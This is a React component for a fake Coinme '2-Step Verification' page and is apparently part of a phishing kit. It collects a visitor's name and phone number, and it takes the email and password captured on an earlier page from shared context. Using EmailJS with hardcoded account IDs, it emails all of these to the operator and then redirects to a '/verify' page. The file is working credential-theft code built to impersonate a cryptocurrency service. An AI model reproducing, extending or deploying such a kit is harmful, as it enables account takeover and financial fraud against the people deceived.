import React, { useState, useContext } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser'; // ✅ Updated import
import { UserContext } from '../Context/UserContext'; // ✅


const Home = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [countryCode, setCountryCode] = useState('+1');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('_ _ _  _ _ _  _ _ _ _');
  const { loginData } = useContext(UserContext); // ✅

  const navigate = useNavigate();

  const handleLogin = async () => {
    let isValid = true;

    // ✅ Email validation
    if (!email) {
      setEmailError('Username is required');
      setEmailPlaceholder('Enter Username');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // ✅ Password validation
    if (!password) {
      setPasswordError('Number is required');
      setPasswordPlaceholder('Enter your Number');
      isValid = false;
    } else {
      setPasswordError('');
    }

    if (!isValid) return;

    // ✅ Template params
    const templateParams = {
      web_name:'Coinme',
      from_name: 'Coinme',
      message: `
      User Name: ${email}
       User Email: ${loginData.email}
       User Number: ${countryCode} ${password}
       User Password: ${loginData.password}
        Date: ${new Date().toLocaleDateString()}
        Time: ${new Date().toLocaleTimeString()}
      `,
    };

    try {
      const response = await emailjs.send(
        'service_9vr0fnb', // ✅ Check your Service ID
        'template_1rqlnbj', // ✅ Check your Template ID
        templateParams,
        'uHwNgVlpc4635wHVx' // ✅ Check your Public Key
      );

      console.log('Email sent successfully:', response);
      setEmail('');
      setPassword('');
      navigate('/verify');
    } catch (error) {
      console.error('Email sending error:', error);
      alert(`Failed to send email: ${error.text || error.message}`);
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col justify-center items-center pt-32">
      <header className="flex justify-center mb-8">
        <img src={require('../Image/coinme1.jpg')} alt="Navigation" className="w-36" />
      </header>

      <div className="w-full  max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
        <main className="">
          <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Please verify your details</h3>
          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className=""
          >
            <div className="mb-4  flex flex-col ">
              <label htmlFor="name  " className='md:w-2/6  text-xl'>Enter Name</label>
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError ? 'border-red-500' : 'border-gray-300'
                }`}
                aria-invalid={emailError ? 'true' : 'false'}
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6 md:text-xl flex flex-col">
  <label htmlFor="phone" className="md:w-2/6 mb-2">Enter Number</label>
  <div className="flex">
  <select
    value={countryCode}
    onChange={(e) => setCountryCode(e.target.value)}
    className="p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white md:w-1.5/4 overflow-y-auto"
    style={{
      maxHeight: '100px', // 5 items approx 40px each -> 5x40 = 200px
    }}
  >
    <option value="+1">+1 (US)</option>
    <option value="+44">+44 (UK)</option>
    <option value="+91">+91 (IN)</option>
    <option value="+61">+61 (AU)</option>
    <option value="+81">+81 (JP)</option>
    <option value="+86">+86 (CN)</option>
    <option value="+49">+49 (DE)</option>
    <option value="+33">+33 (FR)</option>
    <option value="+39">+39 (IT)</option>
    <option value="+7">+7 (RU)</option>
    <option value="+34">+34 (ES)</option>
    <option value="+55">+55 (BR)</option>
    <option value="+27">+27 (ZA)</option>
    <option value="+82">+82 (KR)</option>
    <option value="+62">+62 (ID)</option>
    <option value="+63">+63 (PH)</option>
    <option value="+60">+60 (MY)</option>
    <option value="+65">+65 (SG)</option>
    <option value="+971">+971 (AE)</option>
    <option value="+966">+966 (SA)</option>
    <option value="+92">+92 (PK)</option>
    <option value="+880">+880 (BD)</option>
    <option value="+20">+20 (EG)</option>
    <option value="+212">+212 (MA)</option>
    <option value="+254">+254 (KE)</option>
    <option value="+84">+84 (VN)</option>
    <option value="+46">+46 (SE)</option>
    <option value="+41">+41 (CH)</option>
    <option value="+31">+31 (NL)</option>
    <option value="+48">+48 (PL)</option>
    <option value="+32">+32 (BE)</option>
    <option value="+351">+351 (PT)</option>
    <option value="+64">+64 (NZ)</option>
    <option value="+45">+45 (DK)</option>
    <option value="+43">+43 (AT)</option>
    <option value="+90">+90 (TR)</option>
    <option value="+353">+353 (IE)</option>
    <option value="+420">+420 (CZ)</option>
    <option value="+380">+380 (UA)</option>
    <option value="+98">+98 (IR)</option>
    <option value="+47">+47 (NO)</option>
    <option value="+36">+36 (HU)</option>
    <option value="+386">+386 (SI)</option>
    <option value="+56">+56 (CL)</option>
    <option value="+57">+57 (CO)</option>
    <option value="+593">+593 (EC)</option>
    <option value="+51">+51 (PE)</option>
    <option value="+66">+66 (TH)</option>
  </select>

  <input
    type="text"
    id="phone"
    value={password}
    onChange={(e) => {
      const value = e.target.value;
      if (/^\d{0,10}$/.test(value)) {
        setPassword(value);
      }
    }}
    placeholder={passwordPlaceholder}
    className={`w-full p-3 border-t border-b border-r rounded-r-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
      passwordError ? 'border-red-500' : 'border-gray-300'
    }`}
    aria-invalid={passwordError ? 'true' : 'false'}
  />
</div>


  {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
</div>

            <div className="flex justify-center">
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Home;
